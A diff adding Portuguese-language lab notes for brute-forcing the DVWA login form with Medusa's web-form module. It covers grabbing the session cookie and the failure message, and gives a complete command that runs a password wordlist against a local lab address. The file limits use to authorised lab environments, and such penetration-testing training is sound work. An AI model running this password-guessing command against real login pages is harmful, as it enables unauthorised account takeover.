@@ -1,0 +1,45 @@
+DVWA - Notas de teste com Medusa web-form
+=========================================
+
+Uso permitido:
+- Somente em DVWA local, Metasploitable ou outro ambiente autorizado.
+- Nao execute contra sites reais ou sistemas de terceiros.
+
+Checklist:
+1. Confirmar que o DVWA esta acessivel:
+   http://192.168.56.101/dvwa
+
+2. Fazer login no DVWA pelo navegador.
+
+3. Ajustar o nivel de seguranca para "low".
+
+4. Coletar o cookie PHPSESSID no navegador.
+   Exemplo no Firefox/Chrome:
+   DevTools -> Application/Storage -> Cookies -> PHPSESSID.
+
+5. Confirmar a frase de erro exibida quando a senha esta incorreta.
+   Em muitas instalacoes:
+   Username and/or password incorrect.
+
+6. Rodar o exemplo abaixo a partir da raiz do repositorio:
+
+   SESSIONID="cole_o_phpsessid_aqui"
+
+   medusa -h 192.168.56.101 \
+     -u admin \
+     -P wordlists/passwords.txt \
+     -M web-form \
+     -m USER-AGENT:"Mozilla/5.0" \
+     -m FORM:"/dvwa/vulnerabilities/brute/" \
+     -m DENY-SIGNAL:"Username and/or password incorrect." \
+     -m FORM-DATA:"get?username=&password=&Login=Login" \
+     -m CUSTOM-HEADER:"Cookie: PHPSESSID=${SESSIONID}; security=low" \
+     -f \
+     -O results/dvwa-medusa.txt
+
+Observacoes:
+- O modulo web-form considera sucesso quando o texto em DENY-SIGNAL deixa de aparecer na resposta.
+- Se o DVWA redirecionar para login.php, o cookie ou a sessao provavelmente expirou.
+- Se o texto de erro for diferente, ajuste DENY-SIGNAL.
+- O campo de usuario deve aparecer antes do campo de senha no FORM-DATA.
+- Em alguns ambientes, ferramentas como Burp Suite ajudam a confirmar rota, metodo e parametros antes de montar o comando.
